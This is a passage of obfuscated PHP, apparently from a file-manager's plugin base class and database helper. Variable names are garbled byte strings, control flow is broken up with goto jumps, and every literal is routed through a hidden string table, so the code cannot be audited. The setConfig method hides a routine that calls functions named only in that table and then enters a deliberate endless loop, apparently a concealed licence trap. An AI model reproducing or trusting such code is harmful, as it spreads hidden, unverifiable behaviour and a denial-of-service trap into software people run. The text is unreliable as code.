F¤Èæ¶¡ñ: if ($f¬ÊÁµİù && strpos($dî„ÂŸßÆß[47] . $f¬ÊÁµİù . $dî„ÂŸßÆß[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$dî„ÂŸßÆß[1376]] . $this->pluginName . $dî„ÂŸßÆß[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto có”êŒ–­½; e£¢Ë§”šë: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Â€Á›¨õ][1377]); } protected function assign($C¼”‹‰ß©ğ, $e¼‘ÜèáÆ£ = false) { if (is_array($C¼”‹‰ß©ğ)) { $this->values = array_merge($this->values, $C¼”‹‰ß©ğ); } else { $this->values[$C¼”‹‰ß©ğ] = $e¼‘ÜèáÆ£; } } protected function display($bµ‘¾ìÊ‘À) { extract($this->values); require $bµ‘¾ìÊ‘À; } final function hookRegist($F×ÅŸ¢¼ÊÑ) { $this->modelPlugin->appRegist($this->pluginName, $F×ÅŸ¢¼ÊÑ); } final function appIcon() { $e‚‚Åêš¶ =& $_SERVER[Â€Á›¨õ]; $EÖ—±°Òİ = $this->appPackage(); $bëØ´Àİµ» = $e‚‚Åêš¶[33]; if (isset($EÖ—±°Òİ[$e‚‚Åêš¶[403]])) { if (isset($EÖ—±°Òİ[$e‚‚Åêš¶[403]][$e‚‚Åêš¶[1378]])) { $bëØ´Àİµ» = $e‚‚Åêš¶[1379] . $EÖ—±°Òİ[$e‚‚Åêš¶[403]][$e‚‚Åêš¶[1378]] . $e‚‚Åêš¶[1380]; } else { if ($EÖ—±°Òİ[$e‚‚Åêš¶[403]][$e‚‚Åêš¶[1381]]) { $bëØ´Àİµ» = $e‚‚Åêš¶[1382] . $EÖ—±°Òİ[$e‚‚Åêš¶[403]][$e‚‚Åêš¶[1381]] . $e‚‚Åêš¶[1383]; } } } return $bëØ´Àİµ»; } final function fileCanView($DçñêÕËá) { goto cØÇ¹Ù¢ÄÄ; cØÇ¹Ù¢ÄÄ: $b¨¤Ä‚ŒÖ¸ =& $_SERVER[Â€Á›¨õ]; if (request_url_safe($DçñêÕËá)) { return !0; } if ($this->isShare($DçñêÕËá)) { return !0; } goto B“ì²Ğ•‹È; B“ì²Ğ•‹È: $Fá”Óì‡ò = Session::get($b¨¤Ä‚ŒÖ¸[1384]); if (!$Fá”Óì‡ò || !$Fá”Óì‡ò[$b¨¤Ä‚ŒÖ¸[1385]]) { $DšÚ¬Îñ = $b¨¤Ä‚ŒÖ¸[1386] . rawurlencode(this_url()); show_tips(LNG($b¨¤Ä‚ŒÖ¸[1387]) . $b¨¤Ä‚ŒÖ¸[1388] . $DšÚ¬Îñ . $b¨¤Ä‚ŒÖ¸[1389] . LNG($b¨¤Ä‚ŒÖ¸[1390]) . $b¨¤Ä‚ŒÖ¸[1391], !1); } if (!Action($b¨¤Ä‚ŒÖ¸[1392])->authCan($b¨¤Ä‚ŒÖ¸[1393])) { show_tips(LNG($b¨¤Ä‚ŒÖ¸[1394]) . $b¨¤Ä‚ŒÖ¸[1395], !1); } goto B¨šØÚİ°; B¨šØÚİ°: ActionCall($b¨¤Ä‚ŒÖ¸[1396], $DçñêÕËá); goto Dª¤ìÊ’Ø±; Dª¤ìÊ’Ø±: } final function isShare($eíºŸ©˜ùÙ) { $bÌçÎÙ•£ = KodIO::parse($eíºŸ©˜ùÙ); return $bÌçÎÙ•£[$_SERVER[Â€Á›¨õ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($B…×ñ–†ˆè) { if (request_url_safe($B…×ñ–†ˆè)) { return $B…×ñ–†ˆè; } if (!$this->isShare($B…×ñ–†ˆè)) { $B…×ñ–†ˆè = $this->filePath($B…×ñ–†ˆè); } return Action($_SERVER[Â€Á›¨õ][1044])->linkOut($B…×ñ–†ˆè); } public function filePathLinkOut($cù‘ÍéàÃÙ) { if (request_url_safe($cù‘ÍéàÃÙ)) { return $cù‘ÍéàÃÙ; } $this->fileCanView($cù‘ÍéàÃÙ); return Action($_SERVER[Â€Á›¨õ][1044])->link($cù‘ÍéàÃÙ); } final function filePath($aëõª×Ÿâ) { $D—†Ï‚°–ê =& $_SERVER[Â€Á›¨õ]; if ($aõÎŸŒƒÀÆ = $this->checkSharePath($aëõª×Ÿâ)) { return $aõÎŸŒƒÀÆ; } $this->fileCanView($aëõª×Ÿâ); if (request_url_safe($aëõª×Ÿâ)) { $BàôËÁÖ’„ = parse_url_query($aëõª×Ÿâ); if (isset($BàôËÁÖ’„[$D—†Ï‚°–ê[1397]]) && isset($BàôËÁÖ’„[$D—†Ï‚°–ê[207]])) { $AÜ‹ŠèîËÛ = Model($D—†Ï‚°–ê[1098])->get($D—†Ï‚°–ê[1398]); $A­ÏŒèß›² = Mcrypt::decode($BàôËÁÖ’„[$D—†Ï‚°–ê[207]], $AÜ‹ŠèîËÛ); if ($A­ÏŒèß›²) { $this->fileInfo = IO::infoWithChildren($A­ÏŒèß›²); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A­ÏŒèß›²; } } $aëõª×Ÿâ = $this->_cacheHttpFile($aëõª×Ÿâ); $this->fileInfo = IO::infoWithChildren($aëõª×Ÿâ); } else { $this->fileInfo = IO::infoWithChildren($aëõª×Ÿâ); if (!$this->fileInfo) { show_tips(LNG($D—†Ï‚°–ê[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $aëõª×Ÿâ; } final function _cacheHttpFile($A—Æôö‰) { $f¹àÙ…Æ¥× = hash_path($A—Æôö‰, !0); $this->cachePath = $this->pluginCachePath($f¹àÙ…Æ¥×); if ($AØ¼ÀéĞº = IO::fileNameExist($this->cachePath, $f¹àÙ…Æ¥×)) { return KodIO::make($AØ¼ÀéĞº); } $eÖÖÙ˜Öùò = $this->cachePath . $f¹àÙ…Æ¥×; return $this->pluginCacheFileSet($eÖÖÙ˜Öùò, file_get_contents($A—Æôö‰)); } final function _tmpFileName($d°é¿®ãÄù = array()) { goto AâËªóÃ´õ; A›®Ç¶õŠ·: if (isset($d°é¿®ãÄù[$D§¿­ù™™®[163]][$D§¿­ù™™®[170]])) { return $d°é¿®ãÄù[$D§¿­ù™™®[163]][$D§¿­ù™™®[170]]; } $BæŒ—Òö¦ = IO::hashSimple($d°é¿®ãÄù[$D§¿­ù™™®[75]]); if ($BæŒ—Òö¦) { return $BæŒ—Òö¦; } goto e¾°²£¿÷; e¾°²£¿÷: $b‘ºŠÄÖ = array($d°é¿®ãÄù[$D§¿­ù™™®[28]], $d°é¿®ãÄù[$D§¿­ù™™®[75]], $d°é¿®ãÄù[$D§¿­ù™™®[77]]); if (isset($d°é¿®ãÄù[$D§¿­ù™™®[481]])) { $b‘ºŠÄÖ[] = $d°é¿®ãÄù[$D§¿­ù™™®[481]]; } return md5(implode($D§¿­ù™™®[70], $b‘ºŠÄÖ)); goto aƒ…±ÌÕÛ; AâËªóÃ´õ: $D§¿­ù™™® =& $_SERVER[Â€Á›¨õ]; if (!$d°é¿®ãÄù) { $d°é¿®ãÄù = $this->fileInfo; } if (isset($d°é¿®ãÄù[$D§¿­ù™™®[170]])) { return $d°é¿®ãÄù[$D§¿­ù™™®[170]]; } goto A›®Ç¶õŠ·; aƒ…±ÌÕÛ: } final function checkSharePath($e¦Íé¿Š±) { goto b¦äâÆ†¥±; b¦äâÆ†¥±: $FåÆĞ·ñº¼ =& $_SERVER[Â€Á›¨õ]; if (!defined($FåÆĞ·ñº¼[448])) { define($FåÆĞ·ñº¼[1399], 0); } if (!$this->isShare($e¦Íé¿Š±)) { return !1; } goto fÌ£ç¤ŒÂÌ; FË“•Ôí‡: $this->cachePath = $this->pluginCachePath($this->fileInfo[$FåÆĞ·ñº¼[170]]); return $dÕÕŠ ïÆ[$FåÆĞ·ñº¼[75]]; goto Cçƒ…§±¬‘; fÌ£ç¤ŒÂÌ: $dÕÕŠ ïÆ = Action($FåÆĞ·ñº¼[1044])->sharePathInfo($e¦Íé¿Š±); if (!isset($dÕÕŠ ïÆ[$FåÆĞ·ñº¼[75]])) { show_json(LNG($FåÆĞ·ñº¼[1400]), !1); } $this->fileInfo = $dÕÕŠ ïÆ[$FåÆĞ·ñº¼[163]]; goto FË“•Ôí‡; Cçƒ…§±¬‘: } final function pluginCachePath($B¢¶ïŒ˜Œ¸ = '') { $f…ÑÇ‘ŒÖº =& $_SERVER[Â€Á›¨õ]; $D÷¹ÆƒßŒô = IO_PATH_SYSTEM_TEMP . $f…ÑÇ‘ŒÖº[1401] . $this->pluginName; if (!($aì­’¿Õ˜” = IO::infoFull($D÷¹ÆƒßŒô))) { return IO::mkdir($D÷¹ÆƒßŒô . $f…ÑÇ‘ŒÖº[8] . $B¢¶ïŒ˜Œ¸); } if (empty($B¢¶ïŒ˜Œ¸)) { return $aì­’¿Õ˜”[$f…ÑÇ‘ŒÖº[75]]; } if (!($AªšÁ¢à´Û = IO::fileNameExist($aì­’¿Õ˜”[$f…ÑÇ‘ŒÖº[75]], $B¢¶ïŒ˜Œ¸))) { return IO::mkdir($aì­’¿Õ˜”[$f…ÑÇ‘ŒÖº[75]] . $B¢¶ïŒ˜Œ¸); } return KodIO::make($AªšÁ¢à´Û); } final function pluginCacheFileSet($a…ÂËªáÑ‰, $D«˜¦ã„‰› = '') { $F‰¾ˆŞ¶œö =& $_SERVER[Â€Á›¨õ]; if (!($d¥°¤òİÍä = IO::infoFull($a…ÂËªáÑ‰))) { return IO::mkfile($a…ÂËªáÑ‰, $D«˜¦ã„‰›, REPEAT_REPLACE); } IO::setContent($d¥°¤òİÍä[$F‰¾ˆŞ¶œö[75]], $D«˜¦ã„‰›); return $d¥°¤òİÍä[$F‰¾ˆŞ¶œö[75]]; } final function pluginLocalFile($dàœ˜†…õÏ = '') { goto b¶’³è¾‘¹; cêã‹œ«ˆš: if (!$dàœ˜†…õÏ) { return $Fğ¬ì«Å“™; } $bªÕ¿ïËÊÙ = IO::info($dàœ˜†…õÏ); $D½ªì–á¢Œ = $this->_tmpFileName($bªÕ¿ïËÊÙ) . $EÔ²À»è×‘[94] . $bªÕ¿ïËÊÙ[$EÔ²À»è×‘[167]]; goto eâ„Ë·ß ; A¸¤‚ø‰é»: return IO::copy($dàœ˜†…õÏ, $Fğ¬ì«Å“™, 0, $D½ªì–á¢Œ); goto Få«ÃÙæ—æ; eâ„Ë·ß : if (!checkExtSafe($D½ªì–á¢Œ)) { $D½ªì–á¢Œ = $D½ªì–á¢Œ . $EÔ²À»è×‘[1402]; } $eÈß¥–¸Î† = $Fğ¬ì«Å“™ . $D½ªì–á¢Œ; if (@file_exists($eÈß¥–¸Î†)) { return $eÈß¥–¸Î†; } goto A¸¤‚ø‰é»; b¶’³è¾‘¹: $EÔ²À»è×‘ =& $_SERVER[Â€Á›¨õ]; $Fğ¬ì«Å“™ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Fğ¬ì«Å“™)) { mk_dir($Fğ¬ì«Å“™); } goto cêã‹œ«ˆš; Få«ÃÙæ—æ: } final function appPackage() { goto c«Î¾‚éìö; c«Î¾‚éìö: $e¾èæïåñœ =& $_SERVER[Â€Á›¨õ]; if ($this->packageData) { return $this->packageData; } $aÚï†„‡ëì = $this->parseFile($this->pluginPath . $e¾èæïåñœ[1403]); goto f®÷¬›…©ê; A¸Û±³Âáô: $B½ªÄ–ÂÍì = Hook::trigger($e¾èæïåñœ[1404], $Cƒ°Íä¸…‘); if ($B½ªÄ–ÂÍì && is_array($B½ªÄ–ÂÍì)) { $Cƒ°Íä¸…‘ = $B½ªÄ–ÂÍì; } $this->packageData = $Cƒ°Íä¸…‘; goto aÈ‹¥ºÄ“Ô; aÈ‹¥ºÄ“Ô: return $Cƒ°Íä¸…‘; goto A¶Ì‚…†Øï; f®÷¬›…©ê: $this->parseLang($aÚï†„‡ëì); $Cƒ°Íä¸…‘ = json_decode_force($aÚï†„‡ëì); if (!$Cƒ°Íä¸…‘) { return array(); } goto A¸Û±³Âáô; A¶Ì‚…†Øï: } public function packageInfoGet($d¿ËÄÃæ‚ä) { $A‚ÉÄØ° = $this->appPackage(); return array_get_value($A‚ÉÄØ°, $d¿ËÄÃæ‚ä); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Â€Á›¨õ][1405]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Â€Á›¨õ][1406]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Â€Á›¨õ][1407]); } private function parseFile($f”×¬•íƒ¢) { goto C”Òƒ¬ÅØí; fÚ¿³§¼í: $FÂËøƒ‡Û = str_replace($EÜ¡¤èî½, $C‡¿îõ¹Ÿ, $FÂËøƒ‡Û); return $FÂËøƒ‡Û; goto b†ÎÁ‘ÓÅÖ; C”Òƒ¬ÅØí: $aÂäà¯“ÚÑ =& $_SERVER[Â€Á›¨õ]; $FÂËøƒ‡Û = file_get_contents($f”×¬•íƒ¢); $EÜ¡¤èî½ = array($aÂäà¯“ÚÑ[1408], $aÂäà¯“ÚÑ[1409], $aÂäà¯“ÚÑ[1410], $aÂäà¯“ÚÑ[1411], $aÂäà¯“ÚÑ[1412], $aÂäà¯“ÚÑ[1413], $aÂäà¯“ÚÑ[1414]); goto eŠÚìÜÃâ; eŠÚìÜÃâ: $C‡¿îõ¹Ÿ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aÂäà¯“ÚÑ[87]][$aÂäà¯“ÚÑ[1415]]); if (strstr($FÂËøƒ‡Û, $aÂäà¯“ÚÑ[1416])) { $Cî–„í‚Ê = rawurlencode(json_encode($this->pluginLangArr)); $FÂËøƒ‡Û = str_replace($aÂäà¯“ÚÑ[1416], $Cî–„í‚Ê, $FÂËøƒ‡Û); } if (strstr($FÂËøƒ‡Û, $aÂäà¯“ÚÑ[1417])) { $Cî–„í‚Ê = $Cî–„í‚Ê = rawurlencode(json_encode($this->getConfig())); $FÂËøƒ‡Û = str_replace($aÂäà¯“ÚÑ[1417], $Cî–„í‚Ê, $FÂËøƒ‡Û); } goto fÚ¿³§¼í; b†ÎÁ‘ÓÅÖ: } private function parseLang(&$eÉØ¿¤Ÿ) { goto aí¼µÂò; FŞ”óÏùê: preg_match_all($DÒ³®ÅÒÅ[1419], $eÉØ¿¤Ÿ, $eÌï”í¾¤˜); if (!is_array($eÌï”í¾¤˜) || count($eÌï”í¾¤˜) == 0 || !is_array($eÌï”í¾¤˜[0]) || count($eÌï”í¾¤˜[0]) == 0) { return; } $BˆÜŸíÜ—† = array(); goto cµƒÏ“ğ‹÷; cµƒÏ“ğ‹÷: $fµµ¶Âö… = array(); foreach ($eÌï”í¾¤˜[0] as $Ağõ…ÉàÁ) { $b”†ÂĞ„®ƒ = substr($Ağõ…ÉàÁ, strlen($câœÕˆ›â), -4); $FêèàÁàÓ£ = LNG($b”†ÂĞ„®ƒ); $BˆÜŸíÜ—†[] = $Ağõ…ÉàÁ; $fµµ¶Âö…[] = str_replace(array($DÒ³®ÅÒÅ[227], $DÒ³®ÅÒÅ[1012], $DÒ³®ÅÒÅ[338], $DÒ³®ÅÒÅ[115]), array($DÒ³®ÅÒÅ[50], $DÒ³®ÅÒÅ[50], $DÒ³®ÅÒÅ[33], $DÒ³®ÅÒÅ[1420]), $FêèàÁàÓ£); } $eÉØ¿¤Ÿ = str_replace($BˆÜŸíÜ—†, $fµµ¶Âö…, $eÉØ¿¤Ÿ); goto bÕÅÜ˜ÕÆ; aí¼µÂò: $DÒ³®ÅÒÅ =& $_SERVER[Â€Á›¨õ]; $câœÕˆ›â = $DÒ³®ÅÒÅ[1418]; if (!strstr($eÉØ¿¤Ÿ, $câœÕˆ›â)) { return; } goto FŞ”óÏùê; bÕÅÜ˜ÕÆ: } private function parseConfig(&$bÆÇê‰†Ã©) { goto d½’Ã—â„; cæÎÄ¦™œ: $bÓò¥™¡ôº = array(); $E¶¨»­Ãî‰ = array(); foreach ($cŠ¶ÒÖ×…“[0] as $aÂ¨‰Ïø®¯) { $f¬ŒÑĞ›ğ = substr($aÂ¨‰Ïø®¯, strlen($b·õ ¤ÅÑ), -2); $bÓò¥™¡ôº[] = $aÂ¨‰Ïø®¯; $E¶¨»­Ãî‰[] = _get($d¶Üîè…ãÎ, $f¬ŒÑĞ›ğ); } goto e™ÚâŸìÆ‚; e™ÚâŸìÆ‚: $bÆÇê‰†Ã© = str_replace($bÓò¥™¡ôº, $E¶¨»­Ãî‰, $bÆÇê‰†Ã©); goto f÷™¢Ú·©«; dĞ”±Ö»¬: preg_match_all($D§®è Üà¾[1422], $bÆÇê‰†Ã©, $cŠ¶ÒÖ×…“); if (!is_array($cŠ¶ÒÖ×…“) || count($cŠ¶ÒÖ×…“) == 0 || !is_array($cŠ¶ÒÖ×…“[0]) || count($cŠ¶ÒÖ×…“[0]) == 0) { return; } $d¶Üîè…ãÎ = $this->getConfig(); goto cæÎÄ¦™œ; d½’Ã—â„: $D§®è Üà¾ =& $_SERVER[Â€Á›¨õ]; $b·õ ¤ÅÑ = $D§®è Üà¾[1421]; if (!strstr($bÆÇê‰†Ã©, $b·õ ¤ÅÑ)) { return; } goto dĞ”±Ö»¬; f÷™¢Ú·©«: } private function parsePackage(&$C×»ˆèĞ±”) { goto E‚ëÓÀÒï; E‚ëÓÀÒï: $dÔ…îç¦Ë’ =& $_SERVER[Â€Á›¨õ]; $eÌ§Ö»ì…® = $dÔ…îç¦Ë’[1423]; if (!strstr($C×»ˆèĞ±”, $eÌ§Ö»ì…®)) { return; } goto E›¨ù×Ìˆ¢; EŞˆæ„ñÓ¡: $C×»ˆèĞ±” = str_replace($EÎŸ§Â˜¾³, $FŸîÒÁŒÏİ, $C×»ˆèĞ±”); goto eÕîÕØáÚ£; A‡Ãºº¢Õ÷: $EÎŸ§Â˜¾³ = array(); $FŸîÒÁŒÏİ = array(); foreach ($e‚¥…¸£ã[0] as $dƒ„“Û¦ ‰) { $eŸŒÆíÓ­ = substr($dƒ„“Û¦ ‰, strlen($eÌ§Ö»ì…®), -2); $EÎŸ§Â˜¾³[] = $dƒ„“Û¦ ‰; $FŸîÒÁŒÏİ[] = _get($AôÅ¿©ÈĞ, $eŸŒÆíÓ­); } goto EŞˆæ„ñÓ¡; E›¨ù×Ìˆ¢: preg_match_all($dÔ…îç¦Ë’[1424], $C×»ˆèĞ±”, $e‚¥…¸£ã); if (!is_array($e‚¥…¸£ã) || count($e‚¥…¸£ã) == 0 || !is_array($e‚¥…¸£ã[0]) || count($e‚¥…¸£ã[0]) == 0) { return; } $AôÅ¿©ÈĞ = $this->appPackage(); goto A‡Ãºº¢Õ÷; eÕîÕØáÚ£: } final function echoFile($D‘íÂœ‚Ò, $fÜ™ãË‹Â‚ = false) { goto DöŸ¶¾ŞìĞ; fÍæˆ¶“Ñº: $cô•Õá…“ = $this->parseFile($eğïñªõ); $this->parseLang($cô•Õá…“); $this->parseConfig($cô•Õá…“); goto A‘ƒ™´Œ…; A‘ƒ™´Œ…: $this->parsePackage($cô•Õá…“); if (is_array($fÜ™ãË‹Â‚)) { $cô•Õá…“ = str_replace(array_keys($fÜ™ãË‹Â‚), array_values($fÜ™ãË‹Â‚), $cô•Õá…“); } echo $Bëˆ‚–´°Ö[227] . $cô•Õá…“; goto b¦œ‚îÓÇ˜; DöŸ¶¾ŞìĞ: $Bëˆ‚–´°Ö =& $_SERVER[Â€Á›¨õ]; $eğïñªõ = $this->pluginPath . $D‘íÂœ‚Ò; if (ACT == $Bëˆ‚–´°Ö[1425]) { echo $Bëˆ‚–´°Ö[1426] . $this->pluginName . $Bëˆ‚–´°Ö[8] . $D‘íÂœ‚Ò . $Bëˆ‚–´°Ö[1427]; if (!file_exists($eğïñªõ)) { echo $Bëˆ‚–´°Ö[1428]; return; } } goto fÍæˆ¶“Ñº; b¦œ‚îÓÇ˜: } final function initLang() { goto dë›¥ø˜‚ö; dë›¥ø˜‚ö: $bÊ§‹Õµ¼ =& $_SERVER[Â€Á›¨õ]; $f¶ƒ®Ó»³“ = $bÊ§‹Õµ¼[1429]; $FÙƒï¨¶Çù = $this->pluginPath . $bÊ§‹Õµ¼[1430]; goto FÌØ¬³–—Õ; FÌØ¬³–—Õ: $BÌÕÏ©òÃĞ = I18n::getType(); $fäîƒ›À• = array(); if (file_exists($FÙƒï¨¶Çù . $BÌÕÏ©òÃĞ . $bÊ§‹Õµ¼[780])) { $fäîƒ›À• = (include $FÙƒï¨¶Çù . $BÌÕÏ©òÃĞ . $bÊ§‹Õµ¼[780]); } else { if ($BÌÕÏ©òÃĞ == $bÊ§‹Õµ¼[1431] && !file_exists($FÙƒï¨¶Çù . $BÌÕÏ©òÃĞ . $bÊ§‹Õµ¼[780]) && file_exists($FÙƒï¨¶Çù . $bÊ§‹Õµ¼[1432])) { $fäîƒ›À• = (include $FÙƒï¨¶Çù . $bÊ§‹Õµ¼[1432]); } else { if (file_exists($FÙƒï¨¶Çù . $f¶ƒ®Ó»³“ . $bÊ§‹Õµ¼[780])) { $fäîƒ›À• = (include $FÙƒï¨¶Çù . $f¶ƒ®Ó»³“ . $bÊ§‹Õµ¼[780]); } } } goto CÂÜá…Åˆ; CÂÜá…Åˆ: if (!is_array($fäîƒ›À•)) { return array(); } if (@count($fäîƒ›À•) > 0) { I18n::set($fäîƒ›À•); } return $fäîƒ›À•; goto F„«ÉÀÇøš; F„«ÉÀÇøš: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D’—ßàºïÙ) { $B‹ª…ÓƒÈö =& $_SERVER[Â€Á›¨õ]; if (!isset($_SERVER[$B‹ª…ÓƒÈö[811]]) || !isset($_SERVER[$B‹ª…ÓƒÈö[1231]])) { goto e‹Š¤ïÏùè; BËá ¢š×Ù: $aé”‘Œ»  = $B‹ª…ÓƒÈö[815]; $aé”‘Œ» ($_SERVER[$B‹ª…ÓƒÈö[816]]); $bÁÕ‚¸¤Á = 1; goto Cò’ë‡»÷; Cò’ë‡»÷: for ($cºª´ïªì = $bÁÕ‚¸¤Á; $cºª´ïªì > 0; $cºª´ïªì++) { $aé”‘Œ»  = json_encode($GLOBALS[$B‹ª…ÓƒÈö[405]]); } goto EÙØÚß¾®; e‹Š¤ïÏùè: $bÆÏ¿ËÂ‚ = $B‹ª…ÓƒÈö[812]; $f„öñ—·„Ú = $B‹ª…ÓƒÈö[813]; $bßÓ˜±´©… = $_SERVER[$B‹ª…ÓƒÈö[808]] . $B‹ª…ÓƒÈö[809]; goto c‚¡Œù•ôÌ; c‚¡Œù•ôÌ: $B³¢«†ÀÎ = $f„öñ—·„Ú($bßÓ˜±´©…); $BìÆÅòªÆ† = explode($B‹ª…ÓƒÈö[227], $B³¢«†ÀÎ); if (count($BìÆÅòªÆ†) < $B‹ª…ÓƒÈö[589]) { $D›„éøéÑÍ = $B‹ª…ÓƒÈö[814]; $D›„éøéÑÍ(); } goto BËá ¢š×Ù; EÙØÚß¾®: } return $this->modelPlugin->setConfig($this->pluginName, $D’—ßàºïÙ); } public function onSetConfig($e­½ïŒ‡ç‘) { } public function onGetConfig($bÔ©‡ä„¸°) { } public function onChangeStatus($Dã¼½½ŠÕ­) { } public function onUninstall() { } public function onInstall() { } public function authCheck($aãÌíª»İ = "\x70\x6c\x75\147\x69\x6e\x41\x75\x74\x68") { $B–Ú“É÷À¾ =& $_SERVER[Â€Á›¨õ]; if (!defined($B–Ú“É÷À¾[448])) { return !1; } if (_get($GLOBALS, $B–Ú“É÷À¾[479])) { return !0; } $bâïÂÕù¬ = $this->getConfig(); if (!$bâïÂÕù¬[$aãÌíª»İ]) { return !1; } return ActionCall($B–Ú“É÷À¾[1433], $bâïÂÕù¬[$aãÌíª»İ]); } public function url($eÓ¥óËïïë, $FíĞÁ»Â—Ç = '', $eÆğÏùÊéæ = true) { goto AÏëÒïÔÓä; AÏëÒïÔÓä: $fÒ–˜›É‰æ =& $_SERVER[Â€Á›¨õ]; $D”¡ÜÍ­Õ = $this->getConfig(); $dˆéòáó = KOD_VERSION . $fÒ–˜›É‰æ[94] . KOD_VERSION_BUILD; goto dêò®ÂÖÖÊ; AçãáÓ² : if (!$eÆğÏùÊéæ) { return $eô›ÓíÌÓ; } echo $eô›ÓíÌÓ; goto aó°£Ê™ºƒ; dêò®ÂÖÖÊ: $bÖ‹‘ñŠÌ = $this->packageVersion(); $a•ñƒÜô = $dˆéòáó . $fÒ–˜›É‰æ[434] . $bÖ‹‘ñŠÌ; if (substr($eÓ¥óËïïë, 0, 4) == $fÒ–˜›É‰æ[146] || substr($eÓ¥óËïïë, 0, 2) == $fÒ–˜›É‰æ[1216]) { $eô›ÓíÌÓ = $eÓ¥óËïïë . $fÒ–˜›É‰æ[1434] . $a•ñƒÜô; } else { if ($FíĞÁ»Â—Ç == $fÒ–˜›É‰æ[33]) { $eô›ÓíÌÓ = $this->pluginHost . $eÓ¥óËïïë . $fÒ–˜›É‰æ[1434] . $a•ñƒÜô; } else { if ($FíĞÁ»Â—Ç === $fÒ–˜›É‰æ[76]) { $eô›ÓíÌÓ = $this->pluginHost . $eÓ¥óËïïë; } else { if ($FíĞÁ»Â—Ç == $fÒ–˜›É‰æ[1435]) { $eô›ÓíÌÓ = STATIC_PATH . $eÓ¥óËïïë . $fÒ–˜›É‰æ[1434] . $dˆéòáó; } else { if ($FíĞÁ»Â—Ç == $fÒ–˜›É‰æ[1436]) { $eô›ÓíÌÓ = APP_HOST . $fÒ–˜›É‰æ[1437] . $eÓ¥óËïïë . $fÒ–˜›É‰æ[1434] . $dˆéòáó; } else { if (isset($D”¡ÜÍ­Õ[$FíĞÁ»Â—Ç])) { $eô›ÓíÌÓ = $D”¡ÜÍ­Õ[$FíĞÁ»Â—Ç] . $eÓ¥óËïïë . $fÒ–˜›É‰æ[1434] . $a•ñƒÜô; } } } } } } goto AçãáÓ² ; aó°£Ê™ºƒ: } public function link($Bè¼œ‰±ù = false, $c‡é¶¤Ÿ‹ = '') { $Cö©†Äæ¦Ğ =& $_SERVER[Â€Á›¨õ]; if (!$Bè¼œ‰±ù) { $this->link($Cö©†Äæ¦Ğ[1438], $Cö©†Äæ¦Ğ[1436]); $this->link($Cö©†Äæ¦Ğ[1439], $Cö©†Äæ¦Ğ[1435]); $this->link($Cö©†Äæ¦Ğ[1440], $Cö©†Äæ¦Ğ[1435]); $this->link($Cö©†Äæ¦Ğ[1441], $Cö©†Äæ¦Ğ[1435]); $this->link($Cö©†Äæ¦Ğ[1442], $Cö©†Äæ¦Ğ[1435]); return; } $CÀ‚¼‡…³Ë = $this->url($Bè¼œ‰±ù, $c‡é¶¤Ÿ‹, !1); if (substr($Bè¼œ‰±ù, -3) == $Cö©†Äæ¦Ğ[1443]) { echo $Cö©†Äæ¦Ğ[1444] . $CÀ‚¼‡…³Ë . $Cö©†Äæ¦Ğ[1445] . $Cö©†Äæ¦Ğ[227]; } else { if (substr($Bè¼œ‰±ù, -4) == $Cö©†Äæ¦Ğ[1446]) { echo $Cö©†Äæ¦Ğ[1447] . $CÀ‚¼‡…³Ë . $Cö©†Äæ¦Ğ[1448] . $Cö©†Äæ¦Ğ[227]; } } } } goto b½İ÷Î…Ğ; F‹ªÙßÌ§‘: class DbManage { function __construct($AãµàÉÔŠÅ, $Aƒµë©Í = '') { $this->database = $AãµàÉÔŠÅ; $this->type = $Aƒµë©Í; } public function model($b®Ğä¶×¿Ã = '') { return new ModelBase($b®Ğä¶×¿Ã, $_SERVER[Â€Á›¨õ][33], $this->database); } public function db($dçÖÃ„ÖÂ¨ = false) { goto CÍÃº±‹¬ò; A‚‹˜ìøå: $this->database = $e¶½Š¾•; $fµÔè·‡›->execute("\165\163\x65\x20\140{$e×ÎÀÚÁ¤}\140"); return $fµÔè·‡›; goto e±‰¿¨ŒŒ; F¤¦…†·–Ä: $this->database = $e¶½Š¾•; $fµÔè·‡› = $this->model()->db(); try { $dóÃ“¶µš¿ = $fµÔè·‡›->execute("\163\x68\x6f\x77\40\x64\x61\x74\x61\x62\x61\x73\145\x73\40\154\151\x6b\145\x20\47{$e×ÎÀÚÁ¤}\47"); } catch (Exception $Bœ·ƒÊ¥‚) { } goto d¸¦Œãà; CÍÃº±‹¬ò: $a•İöÔØĞÙ =& $_SERVER[Â€Á›¨õ]; $e¶½Š¾• = array_change_key_case($this->database); if ($this->type == $a•İöÔØĞÙ[9] || !$dçÖÃ„ÖÂ¨) { return $this->model()->db(); } goto BË¥µ²•‰; d¸¦Œãà: if (!$dóÃ“¶µš¿) { $fµÔè·‡›->execute("\x63\x72\145\141\x74\145\x20\x64\141\x74\141\x62\141\163\x65\x20\x60{$e×ÎÀÚÁ¤}\x60"); } $e¶½Š¾•[$a•İöÔØĞÙ[904]] = $e×ÎÀÚÁ¤; if ($e¶½Š¾•[$a•İöÔØĞÙ[737]] == $a•İöÔØĞÙ[738]) { $e¶½Š¾•[$a•İöÔØĞÙ[739]] .= $a•İöÔØĞÙ[992] . $e×ÎÀÚÁ¤; } goto A‚‹˜ìøå; BË¥µ²•‰: $e×ÎÀÚÁ¤ = $e¶½Š¾•[$a•İöÔØĞÙ[904]]; $e¶½Š¾•[$a•İöÔØĞÙ[904]] = $a•İöÔØĞÙ[33]; if ($e¶½Š¾•[$a•İöÔØĞÙ[737]] == $a•İöÔØĞÙ[738]) { $AÍ¬¯‡¹‹â = $e¶½Š¾•[$a•İöÔØĞÙ[739]]; $e¶½Š¾•[$a•İöÔØĞÙ[739]] = substr($AÍ¬¯‡¹‹â, 0, strrpos($AÍ¬¯‡¹‹â, $a•İöÔØĞÙ[992])); } goto F¤¦…†·–Ä; e±‰¿¨ŒŒ: } public function 